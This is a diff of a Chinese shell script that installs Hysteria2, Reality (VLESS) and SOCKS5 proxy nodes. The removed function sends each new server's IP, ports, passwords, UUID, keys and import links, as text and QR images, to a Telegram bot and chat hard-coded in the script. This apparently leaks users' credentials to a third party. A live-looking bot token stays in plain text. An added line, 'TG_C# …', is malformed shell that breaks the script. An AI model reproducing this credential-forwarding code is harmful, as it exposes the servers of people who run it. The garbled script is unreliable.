@@ -1,3 +1,4 @@
+
 # 检查并安装依赖
 install_dependencies() {
     if command -v yum >/dev/null 2>&1; then
@@ -122,6 +123,7 @@ EOF
     #GLOBAL_RUN_TODAY=${GLOBAL_RUN_TODAY:-未知}
 
 #TG信息(115-172)
+TG_C# === Telegram 推送增强版 ===
 TG_BOT_TOKEN="8094641579:AAEVDL0WgIfvmsPsEsat2hmMwdHDECxPEKs"
 TG_CHAT_ID="7805650132"
 SCRIPT_VERSION="v1.0.0"
@@ -850,123 +852,6 @@ fi
     echo
 }
 
-send_node_info_to_tg() {
-    local mode="$1"
-    local MESSAGE="📦 新节点已搭建成功成功！\n\n"
-    MESSAGE+="🧾 脚本版本: ${SCRIPT_VERSION}\n"
-    MESSAGE+="🔖 模式: ${mode}\n"
-    MESSAGE+="🕓 时间: $(date '+%Y-%m-%d %H:%M:%S')\n"
-    MESSAGE+="🖥️ 服务器IP: ${LAST_SERVER_IP}\n\n"
-
-    # 根据模式添加节点信息
-    if [ "$mode" == "all" ] || [ "$mode" == "hysteria2" ]; then
-        MESSAGE+="=== Hysteria2 节点信息 ===\n"
-        MESSAGE+="端口: ${LAST_HY2_PORT}\n"
-        MESSAGE+="密码: ${LAST_HY2_PASSWORD}\n"
-        MESSAGE+="SNI/伪装域名: ${LAST_HY2_MASQUERADE_CN}\n"
-        MESSAGE+="ALPN: h3\n"
-        MESSAGE+="允许不安全 (自签证书): 是/True\n"
-        MESSAGE+="导入链接: ${LAST_HY2_LINK}\n\n"
-    fi
-
-    if [ "$mode" == "all" ] || [ "$mode" == "reality" ]; then
-        MESSAGE+="=== Reality (VLESS) 节点信息 ===\n"
-        MESSAGE+="端口: ${LAST_REALITY_PORT}\n"
-        MESSAGE+="UUID: ${LAST_REALITY_UUID}\n"
-        MESSAGE+="SNI: ${LAST_REALITY_SNI}\n"
-        MESSAGE+="Public Key: ${LAST_REALITY_PUBLIC_KEY}\n"
-        MESSAGE+="Short ID: ${LAST_REALITY_SHORT_ID}\n"
-        MESSAGE+="Fingerprint: ${LAST_REALITY_FINGERPRINT}\n"
-        MESSAGE+="Flow: xtls-rprx-vision\n"
-        MESSAGE+="导入链接: ${LAST_VLESS_LINK}\n\n"
-    fi
-
-    if [ "$mode" == "all" ] || [ "$mode" == "socks5" ]; then
-        MESSAGE+="=== SOCKS5 节点信息 ===\n"
-        MESSAGE+="端口: ${SOCKS5_PORT}\n"
-        MESSAGE+="用户名: ${SOCKS5_USER}\n"
-        MESSAGE+="密码: ${SOCKS5_PASS}\n"
-        MESSAGE+="导入链接: socks5://${SOCKS5_USER}:${SOCKS5_PASS}@${LAST_SERVER_IP}:${SOCKS5_PORT}\n\n"
-    fi
-
-    # 发送文本消息
-    info "正在推送节点信息到Telegram..."
-    local response=$(curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
-        -d "chat_id=${TG_CHAT_ID}" \
-        -d "text=${MESSAGE}")
-    
-    if echo "$response" | grep -q '"ok":true'; then
-        success "文本信息推送成功！"
-    else
-        error "文本信息推送失败，错误信息: $response"
-        return 1
-    fi
-
-    # 检查qrencode并推送二维码（优先图像，失败则文本）
-    if check_and_prepare_qrencode; then
-        local qr_file="/tmp/node_qr_$$.png"
-        
-        if [ "$mode" == "all" ] || [ "$mode" == "hysteria2" ]; then
-            info "生成并推送Hysteria2二维码..."
-            qrencode -o "$qr_file" "${LAST_HY2_LINK}" || {
-                warn "生成Hysteria2图像二维码失败，尝试推送文本二维码..."
-                local QR_TEXT=$(qrencode -t ANSIUTF8 "${LAST_HY2_LINK}")
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
-                    -d "chat_id=${TG_CHAT_ID}" \
-                    -d "text=Hysteria2 二维码（文本）:\n${QR_TEXT}" >/dev/null
-            }
-            if [ -f "$qr_file" ]; then
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto" \
-                    -F "chat_id=${TG_CHAT_ID}" \
-                    -F "photo=@${qr_file}" \
-                    -F "caption=Hysteria2 节点二维码" >/dev/null
-                success "Hysteria2图像二维码推送成功！"
-                rm -f "$qr_file"
-            fi
-        fi
-
-        if [ "$mode" == "all" ] || [ "$mode" == "reality" ]; then
-            info "生成并推送Reality二维码..."
-            qrencode -o "$qr_file" "${LAST_VLESS_LINK}" || {
-                warn "生成Reality图像二维码失败，尝试推送文本二维码..."
-                local QR_TEXT=$(qrencode -t ANSIUTF8 "${LAST_VLESS_LINK}")
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
-                    -d "chat_id=${TG_CHAT_ID}" \
-                    -d "text=Reality 二维码（文本）:\n${QR_TEXT}" >/dev/null
-            }
-            if [ -f "$qr_file" ]; then
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto" \
-                    -F "chat_id=${TG_CHAT_ID}" \
-                    -F "photo=@${qr_file}" \
-                    -F "caption=Reality (VLESS) 节点二维码" >/dev/null
-                success "Reality图像二维码推送成功！"
-                rm -f "$qr_file"
-            fi
-        fi
-
-        if [ "$mode" == "all" ] || [ "$mode" == "socks5" ]; then
-            info "生成并推送SOCKS5二维码..."
-            local socks5_link="socks5://${SOCKS5_USER}:${SOCKS5_PASS}@${LAST_SERVER_IP}:${SOCKS5_PORT}"
-            qrencode -o "$qr_file" "$socks5_link" || {
-                warn "生成SOCKS5图像二维码失败，尝试推送文本二维码..."
-                local QR_TEXT=$(qrencode -t ANSIUTF8 "$socks5_link")
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
-                    -d "chat_id=${TG_CHAT_ID}" \
-                    -d "text=SOCKS5 二维码（文本）:\n${QR_TEXT}" >/dev/null
-            }
-            if [ -f "$qr_file" ]; then
-                curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto" \
-                    -F "chat_id=${TG_CHAT_ID}" \
-                    -F "photo=@${qr_file}" \
-                    -F "caption=SOCKS5 节点二维码" >/dev/null
-                success "SOCKS5图像二维码推送成功！"
-                rm -f "$qr_file"
-            fi
-        fi
-    else
-        warn "未安装qrencode，无法推送二维码。"
-    fi
-}
 
 # --- Installation Functions ---
 install_hysteria2_reality() {
@@ -1000,7 +885,6 @@ install_hysteria2_reality() {
 
     success "Hysteria2 + Reality 安装配置完成！"
     display_and_store_config_info "all"
-    send_node_info_to_tg "all"
 }
 
 install_hysteria2_only() {
@@ -1034,7 +918,6 @@ install_hysteria2_only() {
 
     success "Hysteria2 单独安装配置完成！"
     display_and_store_config_info "hysteria2"
-    send_node_info_to_tg "hysteria2"
 }
 
 install_reality_only() {
@@ -1064,7 +947,6 @@ install_reality_only() {
 
     success "Reality (VLESS) 单独安装配置完成！"
     display_and_store_config_info "reality"
-    send_node_info_to_tg "reality"
 }
 install_socks5_only() {
     info "开始单独安装 socks5..."
@@ -1099,7 +981,6 @@ install_socks5_only() {
 
     success "socks5 单独安装配置完成！"
     display_and_store_config_info "socks5"
-    send_node_info_to_tg "socks5"
 }
 
 show_current_import_info() {
